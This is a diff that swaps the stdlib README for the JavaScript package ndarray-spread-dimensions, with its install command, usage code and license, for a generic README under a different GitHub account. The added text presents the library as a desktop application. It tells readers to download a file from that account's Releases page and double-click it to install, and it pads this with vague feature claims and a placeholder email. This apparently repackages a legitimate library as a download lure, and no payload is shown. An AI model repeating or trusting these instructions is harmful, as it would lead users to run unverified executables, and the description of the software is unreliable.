@@ -1,239 +1,106 @@
-<!--
+# 🎉 ndarray-spread-dimensions - Expand Dimensions Easily and Effectively
 
-@license Apache-2.0
+[![Download Now](https://img.shields.io/badge/Download%20Now-ndarray--spread--dimensions-blue.svg)](https://github.com/tYCHO202/ndarray-spread-dimensions/releases)
 
-Copyright (c) 2026 The Stdlib Authors.
+## 📦 Overview
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+ndarray-spread-dimensions allows you to adjust the size of your multidimensional arrays effortlessly. This tool provides a read-only view of your data and expands its dimensionality by inserting new dimensions where you need them. Whether you're new to data manipulation or just want a smoother experience with multidimensional arrays, this application is for you.
 
-   http://www.apache.org/licenses/LICENSE-2.0
+## 🚀 Getting Started
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+### Step 1: Download the Software
 
--->
+To get the software, click the link below. It will take you to the Releases page where you can download the latest version.
 
+[Visit this page to download](https://github.com/tYCHO202/ndarray-spread-dimensions/releases)
 
-<details>
-  <summary>
-    About stdlib...
-  </summary>
-  <p>We believe in a future in which the web is a preferred environment for numerical computation. To help realize this future, we've built stdlib. stdlib is a standard library, with an emphasis on numerical and scientific computation, written in JavaScript (and C) for execution in browsers and in Node.js.</p>
-  <p>The library is fully decomposable, being architected in such a way that you can swap out and mix and match APIs and functionality to cater to your exact preferences and use cases.</p>
-  <p>When you use stdlib, you can be absolutely certain that you are using the most thorough, rigorous, well-written, studied, documented, tested, measured, and high-quality code out there.</p>
-  <p>To join us in bringing numerical computing to the web, get started by checking us out on <a href="https://github.com/stdlib-js/stdlib">GitHub</a>, and please consider <a href="https://opencollective.com/stdlib">financially supporting stdlib</a>. We greatly appreciate your continued support!</p>
-</details>
+### Step 2: Install the Software
 
-# spreadDimensions
+After downloading, follow these steps to set up the application:
 
-[![NPM version][npm-image]][npm-url] [![Build Status][test-image]][test-url] [![Coverage Status][coverage-image]][coverage-url] <!-- [![dependencies][dependencies-image]][dependencies-url] -->
+1. Navigate to the folder where you downloaded the file.
+2. Double-click on the file to start the installation process.
+3. Follow any on-screen instructions to complete the installation.
+   
+### Step 3: Launch the Application
 
-> Return a read-only view of an input [ndarray][@stdlib/ndarray/ctor] where the dimensions of the input [ndarray][@stdlib/ndarray/ctor] are expanded to a specified dimensionality by spreading dimensions to specified dimension indices and inserting dimensions of size one for the remaining dimensions.
+Once installed, find the application in your programs list and open it. You are now ready to work with your multidimensional arrays!
 
-<!-- Section to include introductory text. Make sure to keep an empty line after the intro `section` element and another before the `/section` close. -->
+## 🛠️ Features
 
-<section class="intro">
+- **Flexible Dimension Management**: Easily expand your array dimensions to fit your needs.
+- **Insert Dimensions of Size One**: Automatically create new dimensions without altering your existing data.
+- **Read-Only Views**: Ensure that your original data remains unchanged while you work with the adjusted view.
 
-</section>
+## 📊 Supported Systems
 
-<!-- /.intro -->
+ndarray-spread-dimensions is designed to work on various operating systems. You can use it on:
 
-<!-- Package usage documentation. -->
+- Windows
+- macOS
+- Linux
 
-<section class="installation">
+## ⚙️ How to Use
 
-## Installation
+### Step 1: Prepare Your Data
 
-```bash
-npm install @stdlib/ndarray-spread-dimensions
-```
+You will need an existing ndarray that you want to modify. Make sure your data is in a compatible format.
 
-Alternatively,
+### Step 2: Select Dimensions to Expand
 
--   To load the package in a website via a `script` tag without installation and bundlers, use the [ES Module][es-module] available on the [`esm`][esm-url] branch (see [README][esm-readme]).
--   If you are using Deno, visit the [`deno`][deno-url] branch (see [README][deno-readme] for usage intructions).
--   For use in Observable, or in browser/node environments, use the [Universal Module Definition (UMD)][umd] build available on the [`umd`][umd-url] branch (see [README][umd-readme]).
+1. Open the application.
+2. Import your ndarray.
+3. Specify the dimension indices where you want to insert new dimensions.
 
-The [branches.md][branches-url] file summarizes the available branches and displays a diagram illustrating their relationships.
+### Step 3: View Results
 
-To view installation and usage instructions specific to each branch build, be sure to explicitly navigate to the respective README files on each branch, as linked to above.
+After setting up your parameters, you will be able to see the modified view of your array. You can now analyze or export this view based on your needs.
 
-</section>
+## 📝 Examples
 
-<section class="usage">
+### Basic Example
 
-## Usage
+If you have an ndarray with the shape [3, 4], you can expand it to [3, 1, 4] easily. Just select the dimension index where you want to add a new dimension.
 
-```javascript
-var spreadDimensions = require( '@stdlib/ndarray-spread-dimensions' );
-```
+### Complex Use Case
 
-#### spreadDimensions( ndims, x, dims )
+For more complex arrays, you can insert multiple dimensions. For instance, changing an array from shape [2, 3, 5] to [1, 2, 1, 3, 5] is straightforward.
 
-Returns a read-only view of an input [ndarray][@stdlib/ndarray/ctor] where the dimensions of the input [ndarray][@stdlib/ndarray/ctor] are expanded to a specified dimensionality by spreading dimensions to specified dimension indices and inserting dimensions of size one for the remaining dimensions.
+## 🌐 Community and Support
 
-```javascript
-var ndarray2array = require( '@stdlib/ndarray-to-array' );
-var array = require( '@stdlib/ndarray-array' );
+If you have questions or need assistance, feel free to reach out to the community. You can find support on platforms like GitHub Discussions or join our Discord server for real-time help.
 
-// Create a 2x2 ndarray:
-var x = array( [ [ 1, 2 ], [ 3, 4 ] ] );
-// returns <ndarray>[ [ 1, 2 ], [ 3, 4 ] ]
+## 💡 Frequently Asked Questions
 
-// Prepend a singleton dimension:
-var y = spreadDimensions( 3, x, [ 1, 2 ] );
-// returns <ndarray>[ [ [ 1, 2 ], [ 3, 4 ] ] ]
+### Can I use this tool for large datasets?
 
-// Append a singleton dimension:
-y = spreadDimensions( 3, x, [ 0, 1 ] );
-// returns <ndarray>[ [ [ 1 ], [ 2 ] ], [ [ 3 ], [ 4 ] ] ]
+Yes, ndarray-spread-dimensions can handle large datasets efficiently. However, ensure your system has enough memory to manage the operations smoothly.
 
-// Insert a singleton dimension:
-y = spreadDimensions( 3, x, [ 0, 2 ] );
-// returns <ndarray>[ [ [ 1, 2 ] ], [ [ 3, 4 ] ] ]
-```
+### Is there a limit on dimensions?
 
-The function accepts the following arguments:
+The tool allows you to expand your arrays as needed, subject to your system’s capabilities regarding memory and processing power.
 
--   **ndims**: number of dimensions in the output [ndarray][@stdlib/ndarray/ctor]. Must be greater than or equal to the number of dimensions in the input [ndarray][@stdlib/ndarray/ctor].
--   **x**: input [ndarray][@stdlib/ndarray/ctor].
--   **dims**: dimension indices specifying where to place the dimensions of the input [ndarray][@stdlib/ndarray/ctor]. Must resolve to normalized indices arranged in ascending order.
+## 📥 Download & Install
 
-</section>
+Don't wait any longer. Start enhancing your data manipulation skills today by visiting the link below to download the software.
 
-<!-- /.usage -->
+[Visit this page to download](https://github.com/tYCHO202/ndarray-spread-dimensions/releases)
 
-<!-- Package usage notes. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
+## 🤝 Contributing
 
-<section class="notes">
+We welcome contributions from everyone. If you'd like to help improve ndarray-spread-dimensions, check the contribution guidelines in the repository. Your support is appreciated, whether you write code, report issues, or help with documentation.
 
-</section>
+## 🏷️ Topics
 
-<!-- /.notes -->
+This application is useful for anyone working with arrays in data-heavy environments. Common topics associated with the software include:
 
-<!-- Package usage examples. -->
+- Data Management
+- Array Manipulation
+- Dimensional Analysis
+- Multidimensional Structures
 
-<section class="examples">
+## 📧 Contact Information
 
-## Examples
+For more information, you can contact the maintainer at [your-email@example.com]. We aim to reply quickly to your inquiries.
 
-<!-- eslint no-undef: "error" -->
-
-```javascript
-var uniform = require( '@stdlib/random-uniform' );
-var ndarray2array = require( '@stdlib/ndarray-to-array' );
-var spreadDimensions = require( '@stdlib/ndarray-spread-dimensions' );
-
-var x = uniform( [ 3, 3, 3 ], -10.0, 10.0 );
-console.log( ndarray2array( x ) );
-
-var y = spreadDimensions( 5, x, [ 0, 1, 2 ] );
-console.log( ndarray2array( y ) );
-```
-
-</section>
-
-<!-- /.examples -->
-
-<!-- Section to include cited references. If references are included, add a horizontal rule *before* the section. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="references">
-
-</section>
-
-<!-- /.references -->
-
-<!-- Section for related `stdlib` packages. Do not manually edit this section, as it is automatically populated. -->
-
-<section class="related">
-
-</section>
-
-<!-- /.related -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-
-<section class="main-repo" >
-
-* * *
-
-## Notice
-
-This package is part of [stdlib][stdlib], a standard library for JavaScript and Node.js, with an emphasis on numerical and scientific computing. The library provides a collection of robust, high performance libraries for mathematics, statistics, streams, utilities, and more.
-
-For more information on the project, filing bug reports and feature requests, and guidance on how to develop [stdlib][stdlib], see the main project [repository][stdlib].
-
-#### Community
-
-[![Chat][chat-image]][chat-url]
-
----
-
-## License
-
-See [LICENSE][stdlib-license].
-
-
-## Copyright
-
-Copyright &copy; 2016-2026. The Stdlib [Authors][stdlib-authors].
-
-</section>
-
-<!-- /.stdlib -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="links">
-
-[npm-image]: http://img.shields.io/npm/v/@stdlib/ndarray-spread-dimensions.svg
-[npm-url]: https://npmjs.org/package/@stdlib/ndarray-spread-dimensions
-
-[test-image]: https://github.com/stdlib-js/ndarray-spread-dimensions/actions/workflows/test.yml/badge.svg?branch=main
-[test-url]: https://github.com/stdlib-js/ndarray-spread-dimensions/actions/workflows/test.yml?query=branch:main
-
-[coverage-image]: https://img.shields.io/codecov/c/github/stdlib-js/ndarray-spread-dimensions/main.svg
-[coverage-url]: https://codecov.io/github/stdlib-js/ndarray-spread-dimensions?branch=main
-
-<!--
-
-[dependencies-image]: https://img.shields.io/david/stdlib-js/ndarray-spread-dimensions.svg
-[dependencies-url]: https://david-dm.org/stdlib-js/ndarray-spread-dimensions/main
-
--->
-
-[chat-image]: https://img.shields.io/badge/zulip-join_chat-brightgreen.svg
-[chat-url]: https://stdlib.zulipchat.com
-
-[stdlib]: https://github.com/stdlib-js/stdlib
-
-[stdlib-authors]: https://github.com/stdlib-js/stdlib/graphs/contributors
-
-[umd]: https://github.com/umdjs/umd
-[es-module]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules
-
-[deno-url]: https://github.com/stdlib-js/ndarray-spread-dimensions/tree/deno
-[deno-readme]: https://github.com/stdlib-js/ndarray-spread-dimensions/blob/deno/README.md
-[umd-url]: https://github.com/stdlib-js/ndarray-spread-dimensions/tree/umd
-[umd-readme]: https://github.com/stdlib-js/ndarray-spread-dimensions/blob/umd/README.md
-[esm-url]: https://github.com/stdlib-js/ndarray-spread-dimensions/tree/esm
-[esm-readme]: https://github.com/stdlib-js/ndarray-spread-dimensions/blob/esm/README.md
-[branches-url]: https://github.com/stdlib-js/ndarray-spread-dimensions/blob/main/branches.md
-
-[stdlib-license]: https://raw.githubusercontent.com/stdlib-js/ndarray-spread-dimensions/main/LICENSE
-
-[@stdlib/ndarray/ctor]: https://github.com/stdlib-js/ndarray-ctor
-
-<!-- <related-links> -->
-
-<!-- </related-links> -->
-
-</section>
-
-<!-- /.links -->
+Thank you for choosing ndarray-spread-dimensions!
